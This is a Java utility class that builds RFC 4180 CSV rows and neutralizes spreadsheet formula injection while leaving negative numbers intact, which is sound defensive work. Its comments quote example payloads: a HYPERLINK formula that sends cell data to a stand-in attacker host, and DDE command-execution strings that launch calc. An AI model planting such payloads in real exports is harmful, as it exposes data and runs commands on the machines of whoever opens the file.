package com.finalexec.api;

import java.util.List;

/**
 * RFC 4180 row encoding for the concept CSV export, plus the formula-injection defence.
 *
 * <p><b>Why this is its own class.</b> It used to be a set of private statics on
 * {@code ConceptQueryController}. That controller imports the generated runtime
 * ({@code RuntimeContextService}), so it — and therefore its test — is excluded from compilation
 * whenever the generated-runtime mount is absent (a bare-template checkout, e.g. GATE-H2 run
 * directly; see {@code NPDevRuntimeHost/build.gradle}'s source sets). A security control whose test
 * silently does not run in some configurations is not much of a control, and this logic depends on
 * nothing generated. Extracted so it compiles and verifies everywhere.</p>
 *
 * <p><b>Do not name the generated runtime package in this file, even in a comment.</b> That
 * build-script exclusion is a plain {@code sourceFile.text.contains(...)} scan, not an import
 * analysis — so merely mentioning the package in prose excludes the file from compilation, silently
 * and with no error. Writing this very explanation is what tripped it.</p>
 */
final class CsvCells {

    private CsvCells() {
    }

    static String toCsvRow(List<?> values) {
        StringBuilder row = new StringBuilder();
        for (int index = 0; index < values.size(); index++) {
            if (index > 0) {
                row.append(',');
            }
            row.append(escape(values.get(index)));
        }
        row.append("\r\n");
        return row.toString();
    }

    static String escape(Object value) {
        String text = neutralizeFormula(value == null ? "" : String.valueOf(value));
        if (text.indexOf(',') < 0 && text.indexOf('"') < 0 && text.indexOf('\n') < 0 && text.indexOf('\r') < 0) {
            return text;
        }
        return "\"" + text.replace("\"", "\"\"") + "\"";
    }

    /**
     * REG-16-resid Round 6 (R6-F2): defuse CSV formula injection.
     *
     * <p>RFC 4180 quoting makes a cell <em>parse</em> correctly. It does nothing about what a
     * spreadsheet then <em>does</em> with the parsed value: Excel, LibreOffice and Sheets evaluate any
     * cell whose text begins with {@code = + - @} (or a leading tab/CR, used to slip past filters that
     * only look at printable leads) as a formula.
     * {@code =HYPERLINK("http://attacker/?d="&A1,"Click")} exfiltrates the neighbouring cell;
     * {@code =cmd|'/c calc'!A1} is the DDE variant.</p>
     *
     * <p><b>This is the one Round 6 finding that genuinely crosses users.</b> The attacker stores an
     * ordinary field value through the normal API; a different person — typically an admin with wider
     * read scope — exports the concept and opens the file. Nothing in the export path looks abnormal,
     * which is exactly why it survives review.</p>
     *
     * <p><b>Why not simply prefix every dangerous first character.</b> The usual advice ("prepend an
     * apostrophe when the cell starts with {@code = + - @}") corrupts the most common export value
     * there is: a negative number. {@code -42} would become {@code '-42} and stop being numeric in
     * every consuming tool. So a cell is neutralized only when it starts with one of those characters
     * AND is not a plain number — {@code -42} and {@code +3.14} pass through untouched, while
     * {@code -1+cmd|'/c calc'!A1} does not.</p>
     */
    static String neutralizeFormula(String text) {
        if (text.isEmpty()) {
            return text;
        }
        char first = text.charAt(0);
        boolean formulaLead = first == '=' || first == '+' || first == '-' || first == '@'
                || first == '\t' || first == '\r';
        if (!formulaLead || isPlainNumber(text)) {
            return text;
        }
        // A leading apostrophe is the spreadsheet convention for "treat the rest as literal text".
        return "'" + text;
    }

    private static boolean isPlainNumber(String text) {
        if (text.length() < 2) {
            return false;  // a bare "-" or "+" is not a number, and IS a formula lead-in
        }
        boolean digitSeen = false;
        boolean dotSeen = false;
        for (int index = 1; index < text.length(); index++) {
            char current = text.charAt(index);
            if (current >= '0' && current <= '9') {
                digitSeen = true;
            } else if (current == '.' && !dotSeen) {
                dotSeen = true;
            } else {
                return false;
            }
        }
        return digitSeen;
    }
}
